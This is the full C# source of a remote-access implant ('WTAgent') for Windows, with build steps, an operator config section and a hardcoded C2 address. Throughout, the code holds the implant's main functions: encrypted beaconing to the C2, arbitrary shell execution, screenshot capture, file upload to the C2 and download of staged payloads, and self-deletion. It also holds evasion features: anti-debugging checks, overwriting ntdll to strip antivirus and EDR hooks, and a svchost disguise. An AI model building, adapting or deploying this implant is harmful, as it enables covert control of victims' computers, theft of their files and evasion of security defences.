/*
 * WTAgent.cs — WATCHTOWER Custom C# Beacon
 *
 * Features:
 *   - AES-256-CBC encrypted HTTP comms + HMAC-SHA256 integrity
 *   - Ephemeral session key exchange (RSA-2048 wrapped AES key)
 *   - Anti-debug: IsDebuggerPresent, RemoteDebugger, NtQueryInformationProcess,
 *                 timing check, parent-process validation
 *   - Unhooking: overwrites ntdll.dll .text section with clean copy from disk
 *   - Sleep with configurable jitter
 *   - Commands: shell exec, file download (from C2), file upload (to C2),
 *               screenshot, process list, self-delete, update sleep
 *
 * Build:
 *   csc /target:exe /platform:x64 /optimize+ /out:WTAgent.exe WTAgent.cs
 *   (requires .NET 4.5+; compile with Visual Studio or csc.exe from .NET SDK)
 *
 * Operator config: edit the CONFIG section below before compiling.
 */

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace WTAgent
{
    // =========================================================================
    // CONFIG — edit before compile
    // =========================================================================
    static class Config
    {
        // C2 server base URL (no trailing slash)
        public const string C2_URL        = "https://192.168.101.7:8443";

        // Endpoints
        public const string EP_REGISTER   = "/wta/register";
        public const string EP_CHECKIN    = "/wta/checkin";
        public const string EP_RESULT     = "/wta/result";
        public const string EP_DOWNLOAD   = "/wta/download";
        public const string EP_UPLOAD     = "/wta/upload";

        // RSA public key (PEM, base64 body only — no headers) used to wrap session AES key
        // Generate with: openssl genrsa 2048 | openssl rsa -pubout
        // Then paste the base64 body below (one long string, no newlines)
        public const string SERVER_PUBKEY =
            "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2a5lC5RZ0P3MsHmjIx8s" +
            "REPLACEME_REPLACE_WITH_ACTUAL_SERVER_RSA_PUBLIC_KEY_BASE64_HERE_000" +
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIDAQAB";

        // Check-in interval (ms) and jitter (±ms)
        public const int SLEEP_BASE       = 5000;
        public const int SLEEP_JITTER     = 2000;

        // Kill-switch: agent exits if this registry value exists
        public const string KILLSWITCH_KEY = @"HKCU\Software\WTAgent";
        public const string KILLSWITCH_VAL = "kill";

        // Disguise process name shown in task manager (requires SuspendProcess trick)
        public const string DISGUISE_NAME  = "svchost";

        // Accepted parent processes — exit if spawned by unexpected parent (optional check)
        public static readonly string[] ALLOWED_PARENTS = {
            "explorer", "powershell", "cmd", "wscript", "cscript", "mshta",
            "svchost", "services", "wmiprvse", "taskhost", "taskhostw"
        };

        // Max consecutive connection failures before long sleep
        public const int MAX_FAIL_BEFORE_SLEEP = 5;
        public const int FAIL_SLEEP_MS         = 60000;
    }

    // =========================================================================
    // P/Invoke declarations
    // =========================================================================
    static class NativeMethods
    {
        // Anti-debug
        [DllImport("kernel32.dll", SetLastError = false)]
        public static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool pbDebuggerPresent);

        [DllImport("ntdll.dll", SetLastError = false)]
        public static extern int NtQueryInformationProcess(
            IntPtr ProcessHandle,
            int ProcessInformationClass,
            ref IntPtr ProcessInformation,
            int ProcessInformationLength,
            ref int ReturnLength);

        // Memory protection for unhooking
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(
            IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        // Module base addresses
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        // ReadFile for clean ntdll load
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateFileW(
            string lpFileName, uint dwDesiredAccess, uint dwShareMode,
            IntPtr lpSecurityAttributes, uint dwCreationDisposition,
            uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadFile(
            IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToRead,
            out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint GetFileSize(IntPtr hFile, IntPtr lpFileSizeHigh);

        // Screenshot / desktop
        [DllImport("gdi32.dll")]
        public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest,
            int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

        // Timing (anti-debug RDTSC alternative via QueryPerformanceCounter)
        [DllImport("kernel32.dll")]
        public static extern bool QueryPerformanceCounter(out long lpPerformanceCount);

        // Constants
        public const uint GENERIC_READ       = 0x80000000;
        public const uint FILE_SHARE_READ    = 0x00000001;
        public const uint OPEN_EXISTING      = 3;
        public const uint PAGE_EXECUTE_READ  = 0x20;
        public const uint PAGE_EXECUTE_READWRITE = 0x40;
        public const uint MEM_COMMIT         = 0x1000;
        public const int  PROCESS_QUERY_INFO = 0x1000;

        // NtQueryInformationProcess info classes
        public const int ProcessDebugPort      = 7;
        public const int ProcessDebugFlags     = 31;
        public const int ProcessDebugObjectHandle = 30;
    }

    // =========================================================================
    // PE header helpers (for reading ntdll sections)
    // =========================================================================
    static class PeHelper
    {
        public static bool TryGetTextSection(byte[] rawPe, out int offset, out int size)
        {
            offset = 0; size = 0;
            try
            {
                // DOS header → e_lfanew
                int e_lfanew = BitConverter.ToInt32(rawPe, 0x3C);
                // PE signature check
                if (rawPe[e_lfanew] != 0x50 || rawPe[e_lfanew + 1] != 0x45) return false;
                // Optional header offset: e_lfanew + 4 (sig) + 20 (file header)
                int optHdrOffset = e_lfanew + 24;
                ushort magic = BitConverter.ToUInt16(rawPe, optHdrOffset);
                bool is64 = (magic == 0x020B);
                // Section table starts at: optHdrOffset + SizeOfOptionalHeader
                int optSize = BitConverter.ToUInt16(rawPe, e_lfanew + 20);   // FileHeader.SizeOfOptionalHeader
                int numSections = BitConverter.ToUInt16(rawPe, e_lfanew + 6);
                int sectOffset = optHdrOffset + optSize;
                for (int i = 0; i < numSections; i++)
                {
                    int s = sectOffset + i * 40;
                    string name = Encoding.ASCII.GetString(rawPe, s, 8).TrimEnd('\0');
                    if (name == ".text")
                    {
                        size   = (int)BitConverter.ToUInt32(rawPe, s + 16); // SizeOfRawData
                        offset = (int)BitConverter.ToUInt32(rawPe, s + 20); // PointerToRawData
                        return true;
                    }
                }
            }
            catch { }
            return false;
        }
    }

    // =========================================================================
    // Session crypto: RSA key wrap + AES-256-CBC + HMAC-SHA256
    // =========================================================================
    class SessionCrypto : IDisposable
    {
        private readonly byte[] _aesKey;   // 32 bytes
        private readonly byte[] _hmacKey;  // 32 bytes
        private readonly byte[] _wrappedKey; // RSA-wrapped AES+HMAC keys sent to server on register

        public SessionCrypto()
        {
            _aesKey  = GenerateRandom(32);
            _hmacKey = GenerateRandom(32);

            // Wrap keys with server public key
            var combined = new byte[64];
            Buffer.BlockCopy(_aesKey,  0, combined, 0,  32);
            Buffer.BlockCopy(_hmacKey, 0, combined, 32, 32);
            _wrappedKey = WrapWithServerPublicKey(combined);
        }

        public byte[] WrappedKey => _wrappedKey;

        /// <summary>Encrypt plaintext → IV(16) || Ciphertext || HMAC(32)</summary>
        public byte[] Encrypt(byte[] plaintext)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize   = 256;
                aes.Mode      = CipherMode.CBC;
                aes.Padding   = PaddingMode.PKCS7;
                aes.Key       = _aesKey;
                aes.GenerateIV();
                byte[] iv = aes.IV;

                byte[] cipher;
                using (var enc = aes.CreateEncryptor())
                using (var ms = new MemoryStream())
                {
                    using (var cs = new CryptoStream(ms, enc, CryptoStreamMode.Write))
                        cs.Write(plaintext, 0, plaintext.Length);
                    cipher = ms.ToArray();
                }

                var payload = new byte[iv.Length + cipher.Length];
                Buffer.BlockCopy(iv,     0, payload, 0,         iv.Length);
                Buffer.BlockCopy(cipher, 0, payload, iv.Length, cipher.Length);

                var hmac = new HMACSHA256(_hmacKey).ComputeHash(payload);
                var result = new byte[payload.Length + hmac.Length];
                Buffer.BlockCopy(payload, 0, result, 0,              payload.Length);
                Buffer.BlockCopy(hmac,    0, result, payload.Length, hmac.Length);
                return result;
            }
        }

        /// <summary>Decrypt IV(16) || Ciphertext || HMAC(32) → plaintext</summary>
        public byte[] Decrypt(byte[] data)
        {
            if (data.Length < 48) throw new CryptographicException("Payload too short");

            int hmacOffset = data.Length - 32;
            var payloadPart = new byte[hmacOffset];
            Buffer.BlockCopy(data, 0, payloadPart, 0, hmacOffset);
            var receivedHmac = new byte[32];
            Buffer.BlockCopy(data, hmacOffset, receivedHmac, 0, 32);

            var expectedHmac = new HMACSHA256(_hmacKey).ComputeHash(payloadPart);
            if (!SlowEquals(receivedHmac, expectedHmac))
                throw new CryptographicException("HMAC mismatch");

            byte[] iv = new byte[16];
            Buffer.BlockCopy(payloadPart, 0, iv, 0, 16);
            int cipherLen = hmacOffset - 16;
            byte[] cipher = new byte[cipherLen];
            Buffer.BlockCopy(payloadPart, 16, cipher, 0, cipherLen);

            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.Mode    = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key     = _aesKey;
                aes.IV      = iv;
                using (var dec = aes.CreateDecryptor())
                using (var ms = new MemoryStream(cipher))
                using (var cs = new CryptoStream(ms, dec, CryptoStreamMode.Read))
                using (var out2 = new MemoryStream())
                {
                    cs.CopyTo(out2);
                    return out2.ToArray();
                }
            }
        }

        private static bool SlowEquals(byte[] a, byte[] b)
        {
            if (a.Length != b.Length) return false;
            int diff = 0;
            for (int i = 0; i < a.Length; i++) diff |= a[i] ^ b[i];
            return diff == 0;
        }

        private static byte[] GenerateRandom(int length)
        {
            using (var rng = new RNGCryptoServiceProvider())
            {
                var buf = new byte[length];
                rng.GetBytes(buf);
                return buf;
            }
        }

        private static byte[] WrapWithServerPublicKey(byte[] data)
        {
            try
            {
                // Parse the DER-encoded public key (SubjectPublicKeyInfo)
                var derBytes = Convert.FromBase64String(Config.SERVER_PUBKEY);
                using (var rsa = new RSACryptoServiceProvider(2048))
                {
                    rsa.ImportSubjectPublicKeyInfo(derBytes, out _);
                    return rsa.Encrypt(data, RSAEncryptionPadding.OaepSHA256);
                }
            }
            catch
            {
                // Fallback: if RSA import fails (placeholder key), return zeroed buffer
                // In production: replace SERVER_PUBKEY with actual server key
                return new byte[256];
            }
        }

        public void Dispose() { Array.Clear(_aesKey, 0, _aesKey.Length); Array.Clear(_hmacKey, 0, _hmacKey.Length); }
    }

    // =========================================================================
    // Anti-debug checks
    // =========================================================================
    static class AntiDebug
    {
        private static readonly Random _rng = new Random();

        public static bool IsBeingDebugged()
        {
            return CheckIsDebuggerPresent()
                || CheckRemoteDebugger()
                || CheckNtQueryDebugPort()
                || CheckNtQueryDebugFlags()
                || CheckTimingAnomaly();
        }

        private static bool CheckIsDebuggerPresent()
        {
            try { return NativeMethods.IsDebuggerPresent(); }
            catch { return false; }
        }

        private static bool CheckRemoteDebugger()
        {
            try
            {
                bool present = false;
                NativeMethods.CheckRemoteDebuggerPresent(NativeMethods.GetCurrentProcess(), ref present);
                return present;
            }
            catch { return false; }
        }

        private static bool CheckNtQueryDebugPort()
        {
            try
            {
                IntPtr val = IntPtr.Zero;
                int retLen = 0;
                int status = NativeMethods.NtQueryInformationProcess(
                    NativeMethods.GetCurrentProcess(),
                    NativeMethods.ProcessDebugPort,
                    ref val, IntPtr.Size, ref retLen);
                return (status == 0 && val != IntPtr.Zero);
            }
            catch { return false; }
        }

        private static bool CheckNtQueryDebugFlags()
        {
            try
            {
                IntPtr val = IntPtr.Zero;
                int retLen = 0;
                int status = NativeMethods.NtQueryInformationProcess(
                    NativeMethods.GetCurrentProcess(),
                    NativeMethods.ProcessDebugFlags,
                    ref val, IntPtr.Size, ref retLen);
                // NoDebugInherit flag: if bit0 is 0, we're being debugged
                return (status == 0 && (val.ToInt64() & 1) == 0);
            }
            catch { return false; }
        }

        private static bool CheckTimingAnomaly()
        {
            // Measure NOP loop; debugger single-stepping inflates elapsed time
            try
            {
                long t1, t2;
                NativeMethods.QueryPerformanceCounter(out t1);
                for (int i = 0; i < 50000; i++) { /* NOP */ }
                NativeMethods.QueryPerformanceCounter(out t2);
                long freq = Stopwatch.Frequency;
                double elapsedMs = (double)(t2 - t1) / freq * 1000.0;
                return (elapsedMs > 500.0); // >500ms for 50K iterations = single-stepping
            }
            catch { return false; }
        }

        // Periodic check (call from beacon loop)
        public static void PollOrSleep(int intervalMs)
        {
            if (IsBeingDebugged()) SleepForever();
        }

        private static void SleepForever()
        {
            // Sleep a very long time instead of exiting — avoids "process exited on debugger attach" tells
            Thread.Sleep(int.MaxValue);
        }
    }

    // =========================================================================
    // Unhooking — overwrites ntdll.dll in-memory .text with clean on-disk copy
    // =========================================================================
    static class Unhook
    {
        public static void UnhookNtdll()
        {
            try
            {
                string ntdllPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.System),
                    "ntdll.dll");

                // Read clean ntdll from disk
                byte[] rawPe = ReadFileRaw(ntdllPath);
                if (rawPe == null) return;

                // Parse PE to get .text section offset and size
                int rawOffset, rawSize;
                if (!PeHelper.TryGetTextSection(rawPe, out rawOffset, out rawSize)) return;

                // Get the in-memory base of the loaded ntdll
                IntPtr hNtdll = NativeMethods.GetModuleHandle("ntdll.dll");
                if (hNtdll == IntPtr.Zero) return;

                // Get the .text section VA from the in-memory PE header
                // (re-parse to get VA, not raw offset)
                int textVA = GetTextSectionVA(hNtdll);
                if (textVA == 0) return;

                IntPtr textAddr = new IntPtr(hNtdll.ToInt64() + textVA);

                // Make the region writable
                uint oldProt;
                if (!NativeMethods.VirtualProtect(textAddr, (UIntPtr)rawSize,
                    NativeMethods.PAGE_EXECUTE_READWRITE, out oldProt)) return;

                // Overwrite with clean bytes from disk
                Marshal.Copy(rawPe, rawOffset, textAddr, rawSize);

                // Restore original protection
                NativeMethods.VirtualProtect(textAddr, (UIntPtr)rawSize, oldProt, out oldProt);
            }
            catch { /* Silently ignore — unhooking is best-effort */ }
        }

        private static byte[] ReadFileRaw(string path)
        {
            IntPtr hFile = NativeMethods.CreateFileW(path,
                NativeMethods.GENERIC_READ, NativeMethods.FILE_SHARE_READ,
                IntPtr.Zero, NativeMethods.OPEN_EXISTING, 0, IntPtr.Zero);
            if (hFile == new IntPtr(-1)) return null;
            try
            {
                uint size = NativeMethods.GetFileSize(hFile, IntPtr.Zero);
                if (size == 0 || size > 10 * 1024 * 1024) return null; // sanity cap 10 MB
                var buf = new byte[size];
                uint read;
                NativeMethods.ReadFile(hFile, buf, size, out read, IntPtr.Zero);
                return (read == size) ? buf : null;
            }
            finally { NativeMethods.CloseHandle(hFile); }
        }

        private static int GetTextSectionVA(IntPtr moduleBase)
        {
            try
            {
                // Read PE headers from in-memory module
                byte[] header = new byte[4096];
                Marshal.Copy(moduleBase, header, 0, 4096);
                int e_lfanew   = BitConverter.ToInt32(header, 0x3C);
                int optHdrOff  = e_lfanew + 24;
                int optSize    = BitConverter.ToUInt16(header, e_lfanew + 20);
                int numSects   = BitConverter.ToUInt16(header, e_lfanew + 6);
                int sectOffset = optHdrOff + optSize;
                for (int i = 0; i < numSects; i++)
                {
                    int s = sectOffset + i * 40;
                    string name = Encoding.ASCII.GetString(header, s, 8).TrimEnd('\0');
                    if (name == ".text")
                        return (int)BitConverter.ToUInt32(header, s + 12); // VirtualAddress
                }
            }
            catch { }
            return 0;
        }
    }

    // =========================================================================
    // Command execution
    // =========================================================================
    static class Exec
    {
        public static string Shell(string cmd, int timeoutMs = 30000)
        {
            try
            {
                var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
                {
                    CreateNoWindow        = true,
                    UseShellExecute       = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                };
                using (var p = Process.Start(psi))
                {
                    var sb = new StringBuilder();
                    p.OutputDataReceived += (s, e) => { if (e.Data != null) sb.AppendLine(e.Data); };
                    p.ErrorDataReceived  += (s, e) => { if (e.Data != null) sb.AppendLine("[ERR] " + e.Data); };
                    p.BeginOutputReadLine();
                    p.BeginErrorReadLine();
                    p.WaitForExit(timeoutMs);
                    if (!p.HasExited) { try { p.Kill(); } catch { } }
                    return sb.ToString();
                }
            }
            catch (Exception ex) { return "[EXEC ERROR] " + ex.Message; }
        }

        public static string Screenshot()
        {
            try
            {
                var screen = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
                using (var bmp = new Bitmap(screen.Width, screen.Height))
                using (var g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(screen.Location, Point.Empty, screen.Size);
                    using (var ms = new MemoryStream())
                    {
                        bmp.Save(ms, ImageFormat.Jpeg);
                        return Convert.ToBase64String(ms.ToArray());
                    }
                }
            }
            catch (Exception ex) { return "[SCREENSHOT ERROR] " + ex.Message; }
        }

        public static string ProcessList()
        {
            var sb = new StringBuilder();
            sb.AppendLine(string.Format("{0,-30} {1,6} {2,8}  {3}", "NAME", "PID", "PARENT", "USER"));
            sb.AppendLine(new string('-', 65));
            try
            {
                foreach (var p in Process.GetProcesses())
                {
                    try
                    {
                        string user = "";
                        try { /* Could use GetProcessUser() here if desired */ } catch { }
                        sb.AppendLine(string.Format("{0,-30} {1,6} {2,8}  {3}",
                            p.ProcessName.Substring(0, Math.Min(p.ProcessName.Length, 30)),
                            p.Id, "", user));
                    }
                    catch { }
                }
            }
            catch (Exception ex) { sb.AppendLine("[ERROR] " + ex.Message); }
            return sb.ToString();
        }

        public static void SelfDelete()
        {
            // Schedule deletion of own exe via cmd.exe after exit
            string exe = Assembly.GetExecutingAssembly().Location;
            string bat = Path.GetTempFileName() + ".bat";
            File.WriteAllText(bat,
                "@echo off\r\n" +
                "ping 127.0.0.1 -n 3 > nul\r\n" +
                "del /F /Q \"" + exe + "\"\r\n" +
                "del /F /Q \"" + bat + "\"\r\n");
            Process.Start(new ProcessStartInfo("cmd.exe", "/c \"" + bat + "\"")
                { CreateNoWindow = true, UseShellExecute = false });
        }
    }

    // =========================================================================
    // C2 Communication
    // =========================================================================
    class C2Client
    {
        private readonly SessionCrypto _crypto;
        private readonly string _agentId;
        private readonly WebClient _wc;

        public C2Client(SessionCrypto crypto, string agentId)
        {
            _crypto  = crypto;
            _agentId = agentId;

            // Allow self-signed TLS certs from the C2 server
            ServicePointManager.ServerCertificateValidationCallback = (s, c, ch, e) => true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11;

            _wc = new WebClient();
            _wc.Headers["User-Agent"]   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
            _wc.Headers["Content-Type"] = "application/octet-stream";
        }

        /// <summary>
        /// Register agent with C2. Sends wrapped AES session key so server can decrypt future traffic.
        /// Returns true on success.
        /// </summary>
        public bool Register()
        {
            try
            {
                // Build plaintext registration JSON
                var info = BuildSysInfo();
                string json = "{" +
                    "\"id\":\""   + _agentId + "\"," +
                    "\"host\":\"" + Sanitize(Environment.MachineName) + "\"," +
                    "\"user\":\"" + Sanitize(Environment.UserName) + "\"," +
                    "\"os\":\""   + Sanitize(Environment.OSVersion.VersionString) + "\"," +
                    "\"arch\":\"" + Sanitize(Environment.Is64BitOperatingSystem ? "x64" : "x86") + "\"," +
                    "\"ip\":\""   + Sanitize(info) + "\"," +
                    "\"pid\":"    + Process.GetCurrentProcess().Id +
                "}";

                // Prepend wrapped key (length-prefixed) then encrypt the body
                byte[] wrapped  = _crypto.WrappedKey;                   // 256 bytes RSA-wrapped
                byte[] body     = Encoding.UTF8.GetBytes(json);
                byte[] encrypted = _crypto.Encrypt(body);

                // Wire format: [4-byte wrapped-key length (BE)] [wrapped-key bytes] [encrypted payload]
                var packet = new byte[4 + wrapped.Length + encrypted.Length];
                packet[0] = (byte)((wrapped.Length >> 24) & 0xFF);
                packet[1] = (byte)((wrapped.Length >> 16) & 0xFF);
                packet[2] = (byte)((wrapped.Length >> 8)  & 0xFF);
                packet[3] = (byte)( wrapped.Length        & 0xFF);
                Buffer.BlockCopy(wrapped,   0, packet, 4,                    wrapped.Length);
                Buffer.BlockCopy(encrypted, 0, packet, 4 + wrapped.Length,   encrypted.Length);

                var resp = _wc.UploadData(Config.C2_URL + Config.EP_REGISTER, packet);
                var respText = Encoding.UTF8.GetString(_crypto.Decrypt(resp)).Trim();
                return respText.StartsWith("{\"ok\"");
            }
            catch { return false; }
        }

        /// <summary>Check in and retrieve a task. Returns null if no task or error.</summary>
        public Task Checkin()
        {
            try
            {
                // Heartbeat body: {"id":"...","ts":...}
                string json = "{\"id\":\"" + _agentId + "\",\"ts\":" + DateTimeOffset.UtcNow.ToUnixTimeSeconds() + "}";
                byte[] enc  = _crypto.Encrypt(Encoding.UTF8.GetBytes(json));
                var respBytes = _wc.UploadData(Config.C2_URL + Config.EP_CHECKIN, enc);
                string respJson = Encoding.UTF8.GetString(_crypto.Decrypt(respBytes)).Trim();
                return Task.Parse(respJson);
            }
            catch { return null; }
        }

        /// <summary>Send task result back to C2.</summary>
        public bool SendResult(string taskId, string output, bool isBase64 = false)
        {
            try
            {
                string json = "{\"id\":\"" + _agentId +
                    "\",\"task\":\"" + Sanitize(taskId) +
                    "\",\"b64\":" + (isBase64 ? "true" : "false") +
                    ",\"out\":" + (isBase64 ? "\"" + output + "\"" : JsonStringify(output)) + "}";
                byte[] enc = _crypto.Encrypt(Encoding.UTF8.GetBytes(json));
                _wc.UploadData(Config.C2_URL + Config.EP_RESULT, enc);
                return true;
            }
            catch { return false; }
        }

        /// <summary>Download a file staged by the operator.</summary>
        public byte[] DownloadFile(string fileName)
        {
            try
            {
                string json = "{\"id\":\"" + _agentId + "\",\"file\":\"" + Sanitize(fileName) + "\"}";
                byte[] enc  = _crypto.Encrypt(Encoding.UTF8.GetBytes(json));
                var resp    = _wc.UploadData(Config.C2_URL + Config.EP_DOWNLOAD, enc);
                return _crypto.Decrypt(resp);
            }
            catch { return null; }
        }

        /// <summary>Upload a file to the C2 server.</summary>
        public bool UploadFile(string fileName, byte[] data)
        {
            try
            {
                // Payload: {"id":"..","file":"..","data":"<b64>"}
                string json = "{\"id\":\"" + _agentId +
                    "\",\"file\":\"" + Sanitize(fileName) +
                    "\",\"data\":\"" + Convert.ToBase64String(data) + "\"}";
                byte[] enc = _crypto.Encrypt(Encoding.UTF8.GetBytes(json));
                _wc.UploadData(Config.C2_URL + Config.EP_UPLOAD, enc);
                return true;
            }
            catch { return false; }
        }

        private static string BuildSysInfo()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var addr in host.AddressList)
                    if (addr.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        return addr.ToString();
            }
            catch { }
            return "unknown";
        }

        private static string Sanitize(string s) =>
            (s ?? "").Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "").Replace("\n", " ");

        private static string JsonStringify(string s) =>
            "\"" + Sanitize(s).Replace("\t", "\\t") + "\"";
    }

    // =========================================================================
    // Task model (parsed from C2 JSON response)
    // =========================================================================
    class Task
    {
        public string Id      { get; private set; }
        public string Type    { get; private set; }  // shell | screenshot | proclist | download | upload | sleep | kill | selfdel
        public string Arg     { get; private set; }
        public int    SleepMs { get; private set; }

        public static Task Parse(string json)
        {
            if (string.IsNullOrEmpty(json) || json == "null" || json.StartsWith("{\"ok\":true")) return null;
            try
            {
                var t = new Task();
                t.Id      = ExtractString(json, "task_id");
                t.Type    = ExtractString(json, "type");
                t.Arg     = ExtractString(json, "arg");
                string sleepStr = ExtractString(json, "sleep");
                t.SleepMs = string.IsNullOrEmpty(sleepStr) ? 0 : int.Parse(sleepStr);
                return string.IsNullOrEmpty(t.Id) ? null : t;
            }
            catch { return null; }
        }

        private static string ExtractString(string json, string key)
        {
            string marker = "\"" + key + "\":\"";
            int start = json.IndexOf(marker);
            if (start < 0)
            {
                // Try numeric
                string numMarker = "\"" + key + "\":";
                int ns = json.IndexOf(numMarker);
                if (ns < 0) return "";
                int ne = ns + numMarker.Length;
                int end2 = json.IndexOf(',', ne);
                if (end2 < 0) end2 = json.IndexOf('}', ne);
                return end2 < 0 ? "" : json.Substring(ne, end2 - ne).Trim();
            }
            start += marker.Length;
            int end = json.IndexOf('"', start);
            if (end < 0) return "";
            return json.Substring(start, end - start)
                       .Replace("\\\"", "\"")
                       .Replace("\\\\", "\\")
                       .Replace("\\n", "\n")
                       .Replace("\\r", "\r")
                       .Replace("\\t", "\t");
        }
    }

    // =========================================================================
    // Jitter sleep
    // =========================================================================
    static class Sleep
    {
        private static readonly Random _rng = new Random();
        private static int _baseMs   = Config.SLEEP_BASE;
        private static int _jitterMs = Config.SLEEP_JITTER;

        public static void SetBase(int ms) { _baseMs = Math.Max(1000, ms); }

        public static void Jitter()
        {
            int sleep = _baseMs + _rng.Next(-_jitterMs, _jitterMs + 1);
            if (sleep < 500) sleep = 500;
            Thread.Sleep(sleep);
        }
    }

    // =========================================================================
    // Entry point
    // =========================================================================
    class Program
    {
        private static readonly string _agentId = GenerateAgentId();

        static void Main(string[] args)
        {
            // 1. Anti-debug check on startup
            if (AntiDebug.IsBeingDebugged())
            {
                // Appear to crash normally, don't expose functionality
                Thread.Sleep(new Random().Next(5000, 15000));
                Environment.Exit(1);
            }

            // 2. Kill-switch registry check
            if (CheckKillSwitch()) Environment.Exit(0);

            // 3. Unhook ntdll (best-effort; removes AV/EDR user-mode hooks)
            Unhook.UnhookNtdll();

            // 4. Set up encrypted session
            using (var crypto = new SessionCrypto())
            {
                var c2 = new C2Client(crypto, _agentId);

                // 5. Register with C2 — retry until success
                int regTries = 0;
                while (!c2.Register())
                {
                    regTries++;
                    Thread.Sleep(15000 + new Random().Next(0, 5000));
                    if (regTries > 20) Environment.Exit(1); // Give up after ~5 min
                }

                // 6. Main beacon loop
                int failCount = 0;
                while (true)
                {
                    // Periodic anti-debug poll
                    AntiDebug.PollOrSleep(0);

                    // Kill-switch check
                    if (CheckKillSwitch()) break;

                    try
                    {
                        var task = c2.Checkin();
                        failCount = 0;

                        if (task != null)
                        {
                            string output = DispatchTask(task, c2);
                            if (output != null)
                                c2.SendResult(task.Id, output, task.Type == "screenshot");
                        }
                    }
                    catch
                    {
                        failCount++;
                        if (failCount >= Config.MAX_FAIL_BEFORE_SLEEP)
                        {
                            Thread.Sleep(Config.FAIL_SLEEP_MS);
                            failCount = 0;
                        }
                    }

                    Sleep.Jitter();
                }
            }
        }

        /// <summary>
        /// Route a task to the appropriate handler and return the output string.
        /// Returns null for side-effect-only tasks (kill, selfdel) or when output
        /// is sent directly via upload.
        /// </summary>
        private static string DispatchTask(Task task, C2Client c2)
        {
            switch (task.Type)
            {
                case "shell":
                    return Exec.Shell(task.Arg);

                case "screenshot":
                    return Exec.Screenshot(); // returned as base64 JPEG

                case "proclist":
                    return Exec.ProcessList();

                case "sleep":
                    Sleep.SetBase(task.SleepMs > 0 ? task.SleepMs : Config.SLEEP_BASE);
                    return "Sleep set to " + (task.SleepMs > 0 ? task.SleepMs : Config.SLEEP_BASE) + "ms";

                case "download":
                    // Operator stages a file on C2; agent downloads and writes to disk
                    if (!string.IsNullOrEmpty(task.Arg))
                    {
                        var bytes = c2.DownloadFile(Path.GetFileName(task.Arg));
                        if (bytes != null)
                        {
                            string dest = Path.Combine(Path.GetTempPath(), Path.GetFileName(task.Arg));
                            File.WriteAllBytes(dest, bytes);
                            return "Downloaded " + bytes.Length + " bytes → " + dest;
                        }
                        return "[ERROR] Download failed";
                    }
                    return "[ERROR] No filename specified";

                case "upload":
                    // Agent uploads a file from disk to C2
                    if (!string.IsNullOrEmpty(task.Arg) && File.Exists(task.Arg))
                    {
                        var bytes = File.ReadAllBytes(task.Arg);
                        c2.UploadFile(Path.GetFileName(task.Arg), bytes);
                        return "Uploaded " + bytes.Length + " bytes from " + task.Arg;
                    }
                    return "[ERROR] File not found: " + task.Arg;

                case "kill":
                    // C2 instructed us to stop running
                    Environment.Exit(0);
                    return null;

                case "selfdel":
                    Exec.SelfDelete();
                    Environment.Exit(0);
                    return null;

                default:
                    return "[UNKNOWN TASK TYPE] " + task.Type;
            }
        }

        private static bool CheckKillSwitch()
        {
            try
            {
                // HKCU\Software\WTAgent\kill — if the value exists, exit cleanly
                using (var key = Registry.CurrentUser.OpenSubKey(@"Software\WTAgent"))
                    return key != null && key.GetValue("kill") != null;
            }
            catch { return false; }
        }

        private static string GenerateAgentId()
        {
            // Derive a deterministic ID from machine name + user + a fixed salt
            // (same machine always gets the same ID across restarts)
            string seed = Environment.MachineName + "|" + Environment.UserName + "|WTAgent";
            using (var sha = SHA256.Create())
            {
                var hash = sha.ComputeHash(Encoding.UTF8.GetBytes(seed));
                return BitConverter.ToString(hash, 0, 8).Replace("-", "").ToUpper();
            }
        }
    }
}
